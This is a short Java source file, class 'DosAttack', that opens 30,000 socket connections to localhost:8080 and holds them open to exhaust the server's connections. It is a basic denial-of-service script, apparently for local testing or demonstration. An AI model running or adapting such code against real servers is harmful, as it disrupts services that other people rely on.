package io.staniewicz.dos;

import java.io.IOException;
import java.net.Socket;

public class DosAttack {

    public static void main(String[] args) throws InterruptedException {

        Socket[] sockets = new Socket[30000];

        for (int i = 0; i < 30000; i++) {
            try {
                sockets[i] = new Socket("localhost", 8080);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        Thread.sleep(100_000);
    }
}
